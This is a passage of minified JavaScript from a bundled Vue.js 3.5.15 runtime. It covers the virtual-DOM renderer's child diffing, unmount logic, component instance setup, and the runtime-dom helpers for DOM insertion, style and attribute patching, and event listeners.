        O & 8 ? (E & 16 && lt(b, g, m),
        w !== b && a(d, w)) : E & 16 ? O & 16 ? Mt(b, w, d, _, g, m, x, v, y) : lt(b, g, m, !0) : (E & 8 && a(d, ""),
        O & 16 && He(w, d, _, g, m, x, v, y))
    }
      , $e = (c, f, d, _, g, m, x, v, y) => {
        c = c || et,
        f = f || et;
        const b = c.length
          , E = f.length
          , w = Math.min(b, E);
        let T;
        for (T = 0; T < w; T++) {
            const O = f[T] = y ? Ne(f[T]) : xe(f[T]);
            I(c[T], O, d, null, g, m, x, v, y)
        }
        b > E ? lt(c, g, m, !0, !1, w) : He(f, d, _, g, m, x, v, y, w)
    }
      , Mt = (c, f, d, _, g, m, x, v, y) => {
        let b = 0;
        const E = f.length;
        let w = c.length - 1
          , T = E - 1;
        for (; b <= w && b <= T; ) {
            const O = c[b]
              , R = f[b] = y ? Ne(f[b]) : xe(f[b]);
            if (ut(O, R))
                I(O, R, d, null, g, m, x, v, y);
            else
                break;
            b++
        }
        for (; b <= w && b <= T; ) {
            const O = c[w]
              , R = f[T] = y ? Ne(f[T]) : xe(f[T]);
            if (ut(O, R))
                I(O, R, d, null, g, m, x, v, y);
            else
                break;
            w--,
            T--
        }
        if (b > w) {
            if (b <= T) {
                const O = T + 1
                  , R = O < E ? f[O].el : _;
                for (; b <= T; )
                    I(null, f[b] = y ? Ne(f[b]) : xe(f[b]), d, R, g, m, x, v, y),
                    b++
            }
        } else if (b > T)
            for (; b <= w; )
                _e(c[b], g, m, !0),
                b++;
        else {
            const O = b
              , R = b
              , K = new Map;
            for (b = R; b <= T; b++) {
                const le = f[b] = y ? Ne(f[b]) : xe(f[b]);
                le.key != null && K.set(le.key, b)
            }
            let N, re = 0;
            const X = T - R + 1;
            let he = !1
              , oe = 0;
            const ct = new Array(X);
            for (b = 0; b < X; b++)
                ct[b] = 0;
            for (b = O; b <= w; b++) {
                const le = c[b];
                if (re >= X) {
                    _e(le, g, m, !0);
                    continue
                }
                let be;
                if (le.key != null)
                    be = K.get(le.key);
                else
                    for (N = R; N <= T; N++)
                        if (ct[N - R] === 0 && ut(le, f[N])) {
                            be = N;
                            break
                        }
                be === void 0 ? _e(le, g, m, !0) : (ct[be - R] = b + 1,
                be >= oe ? oe = be : he = !0,
                I(le, f[be], d, null, g, m, x, v, y),
                re++)
            }
            const rs = he ? go(ct) : et;
            for (N = rs.length - 1,
            b = X - 1; b >= 0; b--) {
                const le = R + b
                  , be = f[le]
                  , os = le + 1 < E ? f[le + 1].el : _;
                ct[b] === 0 ? I(null, be, d, os, g, m, x, v, y) : he && (N < 0 || b !== rs[N] ? Be(be, d, os, 2) : N--)
            }
        }
    }
      , Be = (c, f, d, _, g=null) => {
        const {el: m, type: x, transition: v, children: y, shapeFlag: b} = c;
        if (b & 6) {
            Be(c.component.subTree, f, d, _);
            return
        }
        if (b & 128) {
            c.suspense.move(f, d, _);
            return
        }
        if (b & 64) {
            x.move(c, f, d, Ze);
            return
        }
        if (x === Ae) {
            s(m, f, d);
            for (let w = 0; w < y.length; w++)
                Be(y[w], f, d, _);
            s(c.anchor, f, d);
            return
        }
        if (x === Lt) {
            q(c, f, d);
            return
        }
        if (_ !== 2 && b & 1 && v)
            if (_ === 0)
                v.beforeEnter(m),
                s(m, f, d),
                ce( () => v.enter(m), g);
            else {
                const {leave: w, delayLeave: T, afterLeave: O} = v
                  , R = () => {
                    c.ctx.isUnmounted ? i(m) : s(m, f, d)
                }
                  , K = () => {
                    w(m, () => {
                        R(),
                        O && O()
                    }
                    )
                }
                ;
                T ? T(m, R, K) : K()
            }
        else
            s(m, f, d)
    }
      , _e = (c, f, d, _=!1, g=!1) => {
        const {type: m, props: x, ref: v, children: y, dynamicChildren: b, shapeFlag: E, patchFlag: w, dirs: T, cacheIndex: O} = c;
        if (w === -2 && (g = !1),
        v != null && (Pe(),
        Wt(v, null, d, c, !0),
        Re()),
        O != null && (f.renderCache[O] = void 0),
        E & 256) {
            f.ctx.deactivate(c);
            return
        }
        const R = E & 1 && T
          , K = !mt(c);
        let N;
        if (K && (N = x && x.onVnodeBeforeUnmount) && ye(N, f, c),
        E & 6)
            $i(c.component, d, _);
        else {
            if (E & 128) {
                c.suspense.unmount(d, _);
                return
            }
            R && We(c, null, f, "beforeUnmount"),
            E & 64 ? c.type.remove(c, f, d, Ze, _) : b && !b.hasOnce && (m !== Ae || w > 0 && w & 64) ? lt(b, f, d, !1, !0) : (m === Ae && w & 384 || !g && E & 16) && lt(y, f, d),
            _ && ss(c)
        }
        (K && (N = x && x.onVnodeUnmounted) || R) && ce( () => {
            N && ye(N, f, c),
            R && We(c, null, f, "unmounted")
        }
        , d)
    }
      , ss = c => {
        const {type: f, el: d, anchor: _, transition: g} = c;
        if (f === Ae) {
            Ki(d, _);
            return
        }
        if (f === Lt) {
            A(c);
            return
        }
        const m = () => {
            i(d),
            g && !g.persisted && g.afterLeave && g.afterLeave()
        }
        ;
        if (c.shapeFlag & 1 && g && !g.persisted) {
            const {leave: x, delayLeave: v} = g
              , y = () => x(d, m);
            v ? v(c.el, m, y) : y()
        } else
            m()
    }
      , Ki = (c, f) => {
        let d;
        for (; c !== f; )
            d = S(c),
            i(c),
            c = d;
        i(f)
    }
      , $i = (c, f, d) => {
        const {bum: _, scope: g, job: m, subTree: x, um: v, m: y, a: b, parent: E, slots: {__: w}} = c;
        bs(y),
        bs(b),
        _ && Dt(_),
        E && M(w) && w.forEach(T => {
            E.renderCache[T] = void 0
        }
        ),
        g.stop(),
        m && (m.flags |= 8,
        _e(x, c, f, d)),
        v && ce(v, f),
        ce( () => {
            c.isUnmounted = !0
        }
        , f),
        f && f.pendingBranch && !f.isUnmounted && c.asyncDep && !c.asyncResolved && c.suspenseId === f.pendingId && (f.deps--,
        f.deps === 0 && f.resolve())
    }
      , lt = (c, f, d, _=!1, g=!1, m=0) => {
        for (let x = m; x < c.length; x++)
            _e(c[x], f, d, _, g)
    }
      , Pt = c => {
        if (c.shapeFlag & 6)
            return Pt(c.component.subTree);
        if (c.shapeFlag & 128)
            return c.suspense.next();
        const f = S(c.anchor || c.el)
          , d = f && f[Hr];
        return d ? S(d) : f
    }
    ;
    let ln = !1;
    const is = (c, f, d) => {
        c == null ? f._vnode && _e(f._vnode, null, null, !0) : I(f._vnode || null, c, f, null, null, null, d),
        f._vnode = c,
        ln || (ln = !0,
        us(),
        ai(),
        ln = !1)
    }
      , Ze = {
        p: I,
        um: _e,
        m: Be,
        r: ss,
        mt: on,
        mc: He,
        pc: U,
        pbc: Ke,
        n: Pt,
        o: e
    };
    let cn, fn;
    return t && ([cn,fn] = t(Ze)),
    {
        render: is,
        hydrate: cn,
        createApp: so(is, cn)
    }
}
function mn({type: e, props: t}, n) {
    return n === "svg" && e === "foreignObject" || n === "mathml" && e === "annotation-xml" && t && t.encoding && t.encoding.includes("html") ? void 0 : n
}
function qe({effect: e, job: t}, n) {
    n ? (e.flags |= 32,
    t.flags |= 4) : (e.flags &= -33,
    t.flags &= -5)
}
function po(e, t) {
    return (!e || e && !e.pendingBranch) && t && !t.persisted
}
function Mi(e, t, n=!1) {
    const s = e.children
      , i = t.children;
    if (M(s) && M(i))
        for (let r = 0; r < s.length; r++) {
            const o = s[r];
            let l = i[r];
            l.shapeFlag & 1 && !l.dynamicChildren && ((l.patchFlag <= 0 || l.patchFlag === 32) && (l = i[r] = Ne(i[r]),
            l.el = o.el),
            !n && l.patchFlag !== -2 && Mi(o, l)),
            l.type === sn && (l.el = o.el),
            l.type === Ve && !l.el && (l.el = o.el)
        }
}
function go(e) {
    const t = e.slice()
      , n = [0];
    let s, i, r, o, l;
    const u = e.length;
    for (s = 0; s < u; s++) {
        const h = e[s];
        if (h !== 0) {
            if (i = n[n.length - 1],
            e[i] < h) {
                t[s] = i,
                n.push(s);
                continue
            }
            for (r = 0,
            o = n.length - 1; r < o; )
                l = r + o >> 1,
                e[n[l]] < h ? r = l + 1 : o = l;
            h < e[n[r]] && (r > 0 && (t[s] = n[r - 1]),
            n[r] = s)
        }
    }
    for (r = n.length,
    o = n[r - 1]; r-- > 0; )
        n[r] = o,
        o = t[o];
    return n
}
function Pi(e) {
    const t = e.subTree.component;
    if (t)
        return t.asyncDep && !t.asyncResolved ? t : Pi(t)
}
function bs(e) {
    if (e)
        for (let t = 0; t < e.length; t++)
            e[t].flags |= 8
}
const mo = Symbol.for("v-scx")
  , _o = () => Nt(mo);
function _n(e, t, n) {
    return Ri(e, t, n)
}
function Ri(e, t, n=j) {
    const {immediate: s, deep: i, flush: r, once: o} = n
      , l = z({}, n)
      , u = t && s || !t && r !== "post";
    let h;
    if (St) {
        if (r === "sync") {
            const C = _o();
            h = C.__watcherHandles || (C.__watcherHandles = [])
        } else if (!u) {
            const C = () => {}
            ;
            return C.stop = pe,
            C.resume = pe,
            C.pause = pe,
            C
        }
    }
    const a = k;
    l.call = (C, F, I) => Ce(C, a, F, I);
    let p = !1;
    r === "post" ? l.scheduler = C => {
        ce(C, a && a.suspense)
    }
    : r !== "sync" && (p = !0,
    l.scheduler = (C, F) => {
        F ? C() : zn(C)
    }
    ),
    l.augmentJob = C => {
        t && (C.flags |= 4),
        p && (C.flags |= 2,
        a && (C.id = a.uid,
        C.i = a))
    }
    ;
    const S = Ar(e, t, l);
    return St && (h ? h.push(S) : u && S()),
    S
}
function bo(e, t, n) {
    const s = this.proxy
      , i = Y(e) ? e.includes(".") ? Ii(s, e) : () => s[e] : e.bind(s, s);
    let r;
    P(t) ? r = t : (r = t.handler,
    n = t);
    const o = Tt(this)
      , l = Ri(i, r.bind(s), n);
    return o(),
    l
}
function Ii(e, t) {
    const n = t.split(".");
    return () => {
        let s = e;
        for (let i = 0; i < n.length && s; i++)
            s = s[n[i]];
        return s
    }
}
const yo = (e, t) => t === "modelValue" || t === "model-value" ? e.modelModifiers : e[`${t}Modifiers`] || e[`${de(t)}Modifiers`] || e[`${Ue(t)}Modifiers`];
function vo(e, t, ...n) {
    if (e.isUnmounted)
        return;
    const s = e.vnode.props || j;
    let i = n;
    const r = t.startsWith("update:")
      , o = r && yo(s, t.slice(7));
    o && (o.trim && (i = n.map(a => Y(a) ? a.trim() : a)),
    o.number && (i = n.map(wn)));
    let l, u = s[l = un(t)] || s[l = un(de(t))];
    !u && r && (u = s[l = un(Ue(t))]),
    u && Ce(u, e, 6, i);
    const h = s[l + "Once"];
    if (h) {
        if (!e.emitted)
            e.emitted = {};
        else if (e.emitted[l])
            return;
        e.emitted[l] = !0,
        Ce(h, e, 6, i)
    }
}
function Fi(e, t, n=!1) {
    const s = t.emitsCache
      , i = s.get(e);
    if (i !== void 0)
        return i;
    const r = e.emits;
    let o = {}
      , l = !1;
    if (!P(e)) {
        const u = h => {
            const a = Fi(h, t, !0);
            a && (l = !0,
            z(o, a))
        }
        ;
        !n && t.mixins.length && t.mixins.forEach(u),
        e.extends && u(e.extends),
        e.mixins && e.mixins.forEach(u)
    }
    return !r && !l ? (G(e) && s.set(e, null),
    null) : (M(r) ? r.forEach(u => o[u] = null) : z(o, r),
    G(e) && s.set(e, o),
    o)
}
function nn(e, t) {
    return !e || !Yt(t) ? !1 : (t = t.slice(2).replace(/Once$/, ""),
    D(e, t[0].toLowerCase() + t.slice(1)) || D(e, Ue(t)) || D(e, t))
}
function bn(e) {
    const {type: t, vnode: n, proxy: s, withProxy: i, propsOptions: [r], slots: o, attrs: l, emit: u, render: h, renderCache: a, props: p, data: S, setupState: C, ctx: F, inheritAttrs: I} = e
      , Z = Bt(e);
    let V, W;
    try {
        if (n.shapeFlag & 4) {
            const A = i || s
              , J = A;
            V = xe(h.call(J, A, a, p, C, S, F)),
            W = l
        } else {
            const A = t;
            V = xe(A.length > 1 ? A(p, {
                attrs: l,
                slots: o,
                emit: u
            }) : A(p, null)),
            W = t.props ? l : xo(l)
        }
    } catch (A) {
        bt.length = 0,
        en(A, e, 1),
        V = Se(Ve)
    }
    let q = V;
    if (W && I !== !1) {
        const A = Object.keys(W)
          , {shapeFlag: J} = q;
        A.length && J & 7 && (r && A.some(Ln) && (W = wo(W, r)),
        q = rt(q, W, !1, !0))
    }
    return n.dirs && (q = rt(q, null, !1, !0),
    q.dirs = q.dirs ? q.dirs.concat(n.dirs) : n.dirs),
    n.transition && Zn(q, n.transition),
    V = q,
    Bt(Z),
    V
}
const xo = e => {
    let t;
    for (const n in e)
        (n === "class" || n === "style" || Yt(n)) && ((t || (t = {}))[n] = e[n]);
    return t
}
  , wo = (e, t) => {
    const n = {};
    for (const s in e)
        (!Ln(s) || !(s.slice(9)in t)) && (n[s] = e[s]);
    return n
}
;
function So(e, t, n) {
    const {props: s, children: i, component: r} = e
      , {props: o, children: l, patchFlag: u} = t
      , h = r.emitsOptions;
    if (t.dirs || t.transition)
        return !0;
    if (n && u >= 0) {
        if (u & 1024)
            return !0;
        if (u & 16)
            return s ? ys(s, o, h) : !!o;
        if (u & 8) {
            const a = t.dynamicProps;
            for (let p = 0; p < a.length; p++) {
                const S = a[p];
                if (o[S] !== s[S] && !nn(h, S))
                    return !0
            }
        }
    } else
        return (i || l) && (!l || !l.$stable) ? !0 : s === o ? !1 : s ? o ? ys(s, o, h) : !0 : !!o;
    return !1
}
function ys(e, t, n) {
    const s = Object.keys(t);
    if (s.length !== Object.keys(e).length)
        return !0;
    for (let i = 0; i < s.length; i++) {
        const r = s[i];
        if (t[r] !== e[r] && !nn(n, r))
            return !0
    }
    return !1
}
function Co({vnode: e, parent: t}, n) {
    for (; t; ) {
        const s = t.subTree;
        if (s.suspense && s.suspense.activeBranch === e && (s.el = e.el),
        s === e)
            (e = t.vnode).el = n,
            t = t.parent;
        else
            break
    }
}
const Hi = e => e.__isSuspense;
function To(e, t) {
    t && t.pendingBranch ? M(e) ? t.effects.push(...e) : t.effects.push(e) : Rr(e)
}
const Ae = Symbol.for("v-fgt")
  , sn = Symbol.for("v-txt")
  , Ve = Symbol.for("v-cmt")
  , Lt = Symbol.for("v-stc")
  , bt = [];
let ae = null;
function ze(e=!1) {
    bt.push(ae = e ? null : [])
}
function Eo() {
    bt.pop(),
    ae = bt[bt.length - 1] || null
}
let wt = 1;
function vs(e, t=!1) {
    wt += e,
    e < 0 && ae && t && (ae.hasOnce = !0)
}
function Di(e) {
    return e.dynamicChildren = wt > 0 ? ae || et : null,
    Eo(),
    wt > 0 && ae && ae.push(e),
    e
}
function Gt(e, t, n, s, i, r) {
    return Di(H(e, t, n, s, i, r, !0))
}
function In(e, t, n, s, i) {
    return Di(Se(e, t, n, s, i, !0))
}
function Ni(e) {
    return e ? e.__v_isVNode === !0 : !1
}
function ut(e, t) {
    return e.type === t.type && e.key === t.key
}
const Li = ({key: e}) => e ?? null
  , Vt = ({ref: e, ref_key: t, ref_for: n}) => (typeof e == "number" && (e = "" + e),
e != null ? Y(e) || se(e) || P(e) ? {
    i: ue,
    r: e,
    k: t,
    f: !!n
} : e : null);
function H(e, t=null, n=null, s=0, i=null, r=e === Ae ? 0 : 1, o=!1, l=!1) {
    const u = {
        __v_isVNode: !0,
        __v_skip: !0,
        type: e,
        props: t,
        key: t && Li(t),
        ref: t && Vt(t),
        scopeId: hi,
        slotScopeIds: null,
        children: n,
        component: null,
        suspense: null,
        ssContent: null,
        ssFallback: null,
        dirs: null,
        transition: null,
        el: null,
        anchor: null,
        target: null,
        targetStart: null,
        targetAnchor: null,
        staticCount: 0,
        shapeFlag: r,
        patchFlag: s,
        dynamicProps: i,
        dynamicChildren: null,
        appContext: null,
        ctx: ue
    };
    return l ? (es(u, n),
    r & 128 && e.normalize(u)) : n && (u.shapeFlag |= Y(n) ? 8 : 16),
    wt > 0 && !o && ae && (u.patchFlag > 0 || r & 6) && u.patchFlag !== 32 && ae.push(u),
    u
}
const Se = Ao;
function Ao(e, t=null, n=null, s=0, i=null, r=!1) {
    if ((!e || e === Yr) && (e = Ve),
    Ni(e)) {
        const l = rt(e, t, !0);
        return n && es(l, n),
        wt > 0 && !r && ae && (l.shapeFlag & 6 ? ae[ae.indexOf(e)] = l : ae.push(l)),
        l.patchFlag = -2,
        l
    }
    if (jo(e) && (e = e.__vccOpts),
    t) {
        t = Oo(t);
        let {class: l, style: u} = t;
        l && !Y(l) && (t.class = Un(l)),
        G(u) && (Yn(u) && !M(u) && (u = z({}, u)),
        t.style = kt(u))
    }
    const o = Y(e) ? 1 : Hi(e) ? 128 : Dr(e) ? 64 : G(e) ? 4 : P(e) ? 2 : 0;
    return H(e, t, n, s, i, o, r, !0)
}
function Oo(e) {
    return e ? Yn(e) || Si(e) ? z({}, e) : e : null
}
function rt(e, t, n=!1, s=!1) {
    const {props: i, ref: r, patchFlag: o, children: l, transition: u} = e
      , h = t ? Po(i || {}, t) : i
      , a = {
        __v_isVNode: !0,
        __v_skip: !0,
        type: e.type,
        props: h,
        key: h && Li(h),
        ref: t && t.ref ? n && r ? M(r) ? r.concat(Vt(t)) : [r, Vt(t)] : Vt(t) : r,
        scopeId: e.scopeId,
        slotScopeIds: e.slotScopeIds,
        children: l,
        target: e.target,
        targetStart: e.targetStart,
        targetAnchor: e.targetAnchor,
        staticCount: e.staticCount,
        shapeFlag: e.shapeFlag,
        patchFlag: t && e.type !== Ae ? o === -1 ? 16 : o | 16 : o,
        dynamicProps: e.dynamicProps,
        dynamicChildren: e.dynamicChildren,
        appContext: e.appContext,
        dirs: e.dirs,
        transition: u,
        component: e.component,
        suspense: e.suspense,
        ssContent: e.ssContent && rt(e.ssContent),
        ssFallback: e.ssFallback && rt(e.ssFallback),
        el: e.el,
        anchor: e.anchor,
        ctx: e.ctx,
        ce: e.ce
    };
    return u && s && Zn(a, u.clone(a)),
    a
}
function Le(e=" ", t=0) {
    return Se(sn, null, e, t)
}
function Mo(e, t) {
    const n = Se(Lt, null, e);
    return n.staticCount = t,
    n
}
function Fn(e="", t=!1) {
    return t ? (ze(),
    In(Ve, null, e)) : Se(Ve, null, e)
}
function xe(e) {
    return e == null || typeof e == "boolean" ? Se(Ve) : M(e) ? Se(Ae, null, e.slice()) : Ni(e) ? Ne(e) : Se(sn, null, String(e))
}
function Ne(e) {
    return e.el === null && e.patchFlag !== -1 || e.memo ? e : rt(e)
}
function es(e, t) {
    let n = 0;
    const {shapeFlag: s} = e;
    if (t == null)
        t = null;
    else if (M(t))
        n = 16;
    else if (typeof t == "object")
        if (s & 65) {
            const i = t.default;
            i && (i._c && (i._d = !1),
            es(e, i()),
            i._c && (i._d = !0));
            return
        } else {
            n = 32;
            const i = t._;
            !i && !Si(t) ? t._ctx = ue : i === 3 && ue && (ue.slots._ === 1 ? t._ = 1 : (t._ = 2,
            e.patchFlag |= 1024))
        }
    else
        P(t) ? (t = {
            default: t,
            _ctx: ue
        },
        n = 32) : (t = String(t),
        s & 64 ? (n = 16,
        t = [Le(t)]) : n = 8);
    e.children = t,
    e.shapeFlag |= n
}
function Po(...e) {
    const t = {};
    for (let n = 0; n < e.length; n++) {
        const s = e[n];
        for (const i in s)
            if (i === "class")
                t.class !== s.class && (t.class = Un([t.class, s.class]));
            else if (i === "style")
                t.style = kt([t.style, s.style]);
            else if (Yt(i)) {
                const r = t[i]
                  , o = s[i];
                o && r !== o && !(M(r) && r.includes(o)) && (t[i] = r ? [].concat(r, o) : o)
            } else
                i !== "" && (t[i] = s[i])
    }
    return t
}
function ye(e, t, n, s=null) {
    Ce(e, t, 7, [n, s])
}
const Ro = vi();
let Io = 0;
function Fo(e, t, n) {
    const s = e.type
      , i = (t ? t.appContext : e.appContext) || Ro
      , r = {
        uid: Io++,
        vnode: e,
        type: s,
        parent: t,
        appContext: i,
        root: null,
        next: null,
        subTree: null,
        effect: null,
        update: null,
        job: null,
        scope: new er(!0),
        render: null,
        proxy: null,
        exposed: null,
        exposeProxy: null,
        withProxy: null,
        provides: t ? t.provides : Object.create(i.provides),
        ids: t ? t.ids : ["", 0, 0],
        accessCache: null,
        renderCache: [],
        components: null,
        directives: null,
        propsOptions: Ti(s, i),
        emitsOptions: Fi(s, i),
        emit: null,
        emitted: null,
        propsDefaults: j,
        inheritAttrs: s.inheritAttrs,
        ctx: j,
        data: j,
        props: j,
        attrs: j,
        slots: j,
        refs: j,
        setupState: j,
        setupContext: null,
        suspense: n,
        suspenseId: n ? n.pendingId : 0,
        asyncDep: null,
        asyncResolved: !1,
        isMounted: !1,
        isUnmounted: !1,
        isDeactivated: !1,
        bc: null,
        c: null,
        bm: null,
        m: null,
        bu: null,
        u: null,
        um: null,
        bum: null,
        da: null,
        a: null,
        rtg: null,
        rtc: null,
        ec: null,
        sp: null
    };
    return r.ctx = {
        _: r
    },
    r.root = t ? t.root : r,
    r.emit = vo.bind(null, r),
    e.ce && e.ce(r),
    r
}
let k = null, Jt, Hn;
{
    const e = Qt()
      , t = (n, s) => {
        let i;
        return (i = e[n]) || (i = e[n] = []),
        i.push(s),
        r => {
            i.length > 1 ? i.forEach(o => o(r)) : i[0](r)
        }
    }
    ;
    Jt = t("__VUE_INSTANCE_SETTERS__", n => k = n),
    Hn = t("__VUE_SSR_SETTERS__", n => St = n)
}
const Tt = e => {
    const t = k;
    return Jt(e),
    e.scope.on(),
    () => {
        e.scope.off(),
        Jt(t)
    }
}
  , xs = () => {
    k && k.scope.off(),
    Jt(null)
}
;
function Vi(e) {
    return e.vnode.shapeFlag & 4
}
let St = !1;
function Ho(e, t=!1, n=!1) {
    t && Hn(t);
    const {props: s, children: i} = e.vnode
      , r = Vi(e);
    ro(e, s, r, t),
    fo(e, i, n || t);
    const o = r ? Do(e, t) : void 0;
    return t && Hn(!1),
    o
}
function Do(e, t) {
    const n = e.type;
    e.accessCache = Object.create(null),
    e.proxy = new Proxy(e.ctx,Zr);
    const {setup: s} = n;
    if (s) {
        Pe();
        const i = e.setupContext = s.length > 1 ? Lo(e) : null
          , r = Tt(e)
          , o = Ct(s, e, 0, [e.props, i])
          , l = js(o);
        if (Re(),
        r(),
        (l || e.sp) && !mt(e) && pi(e),
        l) {
            if (o.then(xs, xs),
            t)
                return o.then(u => {
                    ws(e, u, t)
                }
                ).catch(u => {
                    en(u, e, 0)
                }
                );
            e.asyncDep = o
        } else
            ws(e, o, t)
    } else
        ji(e, t)
}
function ws(e, t, n) {
    P(t) ? e.type.__ssrInlineRender ? e.ssrRender = t : e.render = t : G(t) && (e.setupState = ci(t)),
    ji(e, n)
}
let Ss;
function ji(e, t, n) {
    const s = e.type;
    if (!e.render) {
        if (!t && Ss && !s.render) {
            const i = s.template || Xn(e).template;
            if (i) {
                const {isCustomElement: r, compilerOptions: o} = e.appContext.config
                  , {delimiters: l, compilerOptions: u} = s
                  , h = z(z({
                    isCustomElement: r,
                    delimiters: l
                }, o), u);
                s.render = Ss(i, h)
            }
        }
        e.render = s.render || pe
    }
    {
        const i = Tt(e);
        Pe();
        try {
            Xr(e)
        } finally {
            Re(),
            i()
        }
    }
}
const No = {
    get(e, t) {
        return Q(e, "get", ""),
        e[t]
    }
};
function Lo(e) {
    const t = n => {
        e.exposed = n || {}
    }
    ;
    return {
        attrs: new Proxy(e.attrs,No),
        slots: e.slots,
        emit: e.emit,
        expose: t
    }
}
function rn(e) {
    return e.exposed ? e.exposeProxy || (e.exposeProxy = new Proxy(ci(xr(e.exposed)),{
        get(t, n) {
            if (n in t)
                return t[n];
            if (n in _t)
                return _t[n](e)
        },
        has(t, n) {
            return n in t || n in _t
        }
    })) : e.proxy
}
function Vo(e, t=!0) {
    return P(e) ? e.displayName || e.name : e.name || t && e.__name
}
function jo(e) {
    return P(e) && "__vccOpts"in e
}
const Uo = (e, t) => Tr(e, t, St)
  , Ko = "3.5.15";
/**
* @vue/runtime-dom v3.5.15
* (c) 2018-present Yuxi (Evan) You and Vue contributors
* @license MIT
**/
let Dn;
const Cs = typeof window < "u" && window.trustedTypes;
if (Cs)
    try {
        Dn = Cs.createPolicy("vue", {
            createHTML: e => e
        })
    } catch {}
const Ui = Dn ? e => Dn.createHTML(e) : e => e
  , $o = "http://www.w3.org/2000/svg"
  , Bo = "http://www.w3.org/1998/Math/MathML"
  , Ee = typeof document < "u" ? document : null
  , Ts = Ee && Ee.createElement("template")
  , Wo = {
    insert: (e, t, n) => {
        t.insertBefore(e, n || null)
    }
    ,
    remove: e => {
        const t = e.parentNode;
        t && t.removeChild(e)
    }
    ,
    createElement: (e, t, n, s) => {
        const i = t === "svg" ? Ee.createElementNS($o, e) : t === "mathml" ? Ee.createElementNS(Bo, e) : n ? Ee.createElement(e, {
            is: n
        }) : Ee.createElement(e);
        return e === "select" && s && s.multiple != null && i.setAttribute("multiple", s.multiple),
        i
    }
    ,
    createText: e => Ee.createTextNode(e),
    createComment: e => Ee.createComment(e),
    setText: (e, t) => {
        e.nodeValue = t
    }
    ,
    setElementText: (e, t) => {
        e.textContent = t
    }
    ,
    parentNode: e => e.parentNode,
    nextSibling: e => e.nextSibling,
    querySelector: e => Ee.querySelector(e),
    setScopeId(e, t) {
        e.setAttribute(t, "")
    },
    insertStaticContent(e, t, n, s, i, r) {
        const o = n ? n.previousSibling : t.lastChild;
        if (i && (i === r || i.nextSibling))
            for (; t.insertBefore(i.cloneNode(!0), n),
            !(i === r || !(i = i.nextSibling)); )
                ;
        else {
            Ts.innerHTML = Ui(s === "svg" ? `<svg>${e}</svg>` : s === "mathml" ? `<math>${e}</math>` : e);
            const l = Ts.content;
            if (s === "svg" || s === "mathml") {
                const u = l.firstChild;
                for (; u.firstChild; )
                    l.appendChild(u.firstChild);
                l.removeChild(u)
            }
            t.insertBefore(l, n)
        }
        return [o ? o.nextSibling : t.firstChild, n ? n.previousSibling : t.lastChild]
    }
}
  , qo = Symbol("_vtc");
function Go(e, t, n) {
    const s = e[qo];
    s && (t = (t ? [t, ...s] : [...s]).join(" ")),
    t == null ? e.removeAttribute("class") : n ? e.setAttribute("class", t) : e.className = t
}
const Es = Symbol("_vod")
  , Jo = Symbol("_vsh")
  , Yo = Symbol("")
  , zo = /(^|;)\s*display\s*:/;
function Zo(e, t, n) {
    const s = e.style
      , i = Y(n);
    let r = !1;
    if (n && !i) {
        if (t)
            if (Y(t))
                for (const o of t.split(";")) {
                    const l = o.slice(0, o.indexOf(":")).trim();
                    n[l] == null && jt(s, l, "")
                }
            else
                for (const o in t)
                    n[o] == null && jt(s, o, "");
        for (const o in n)
            o === "display" && (r = !0),
            jt(s, o, n[o])
    } else if (i) {
        if (t !== n) {
            const o = s[Yo];
            o && (n += ";" + o),
            s.cssText = n,
            r = zo.test(n)
        }
    } else
        t && e.removeAttribute("style");
    Es in e && (e[Es] = r ? s.display : "",
    e[Jo] && (s.display = "none"))
}
const As = /\s*!important$/;
function jt(e, t, n) {
    if (M(n))
        n.forEach(s => jt(e, t, s));
    else if (n == null && (n = ""),
    t.startsWith("--"))
        e.setProperty(t, n);
    else {
        const s = Xo(e, t);
        As.test(n) ? e.setProperty(Ue(s), n.replace(As, ""), "important") : e[s] = n
    }
}
const Os = ["Webkit", "Moz", "ms"]
  , yn = {};
function Xo(e, t) {
    const n = yn[t];
    if (n)
        return n;
    let s = de(t);
    if (s !== "filter" && s in e)
        return yn[t] = s;
    s = Xt(s);
    for (let i = 0; i < Os.length; i++) {
        const r = Os[i] + s;
        if (r in e)
            return yn[t] = r
    }
    return t
}
const Ms = "http://www.w3.org/1999/xlink";
function Ps(e, t, n, s, i, r=ki(t)) {
    s && t.startsWith("xlink:") ? n == null ? e.removeAttributeNS(Ms, t.slice(6, t.length)) : e.setAttributeNS(Ms, t, n) : n == null || r && !Bs(n) ? e.removeAttribute(t) : e.setAttribute(t, r ? "" : je(n) ? String(n) : n)
}
function Rs(e, t, n, s, i) {
    if (t === "innerHTML" || t === "textContent") {
        n != null && (e[t] = t === "innerHTML" ? Ui(n) : n);
        return
    }
    const r = e.tagName;
    if (t === "value" && r !== "PROGRESS" && !r.includes("-")) {
        const l = r === "OPTION" ? e.getAttribute("value") || "" : e.value
          , u = n == null ? e.type === "checkbox" ? "on" : "" : String(n);
        (l !== u || !("_value"in e)) && (e.value = u),
        n == null && e.removeAttribute(t),
        e._value = n;
        return
    }
    let o = !1;
    if (n === "" || n == null) {
        const l = typeof e[t];
        l === "boolean" ? n = Bs(n) : n == null && l === "string" ? (n = "",
        o = !0) : l === "number" && (n = 0,
        o = !0)
    }
    try {
        e[t] = n
    } catch {}
    o && e.removeAttribute(i || t)
}
function ke(e, t, n, s) {
    e.addEventListener(t, n, s)
}
function Qo(e, t, n, s) {
    e.removeEventListener(t, n, s)
}
const Is = Symbol("_vei");
function ko(e, t, n, s, i=null) {
    const r = e[Is] || (e[Is] = {})
      , o = r[t];
    if (s && o)
        o.value = s;
    else {
        const [l,u] = el(t);
        if (s) {
            const h = r[t] = sl(s, i);
            ke(e, l, h, u)
        } else
            o && (Qo(e, l, o, u),
            r[t] = void 0)
    }
}
const Fs = /(?:Once|Passive|Capture)$/;
function el(e) {
    let t;
    if (Fs.test(e)) {
        t = {};
        let s;
        for (; s = e.match(Fs); )
            e = e.slice(0, e.length - s[0].length),
            t[s[0].toLowerCase()] = !0
    }
    return [e[2] === ":" ? e.slice(3) : Ue(e.slice(2)), t]
}
let vn = 0;
const tl = Promise.resolve()
  , nl = () => vn || (tl.then( () => vn = 0),
vn = Date.now());
function sl(e, t) {
    const n = s => {
        if (!s._vts)
            s._vts = Date.now();
        else if (s._vts <= n.attached)
            return;
        Ce(il(s, n.value), t, 5, [s])
    }
    ;
    return n.value = e,
    n.attached = nl(),
    n
}
function il(e, t) {
    if (M(t)) {
        const n = e.stopImmediatePropagation;
        return e.stopImmediatePropagation = () => {
            n.call(e),
            e._stopped = !0
        }
        ,
        t.map(s => i => !i._stopped && s && s(i))
    } else
        return t
}
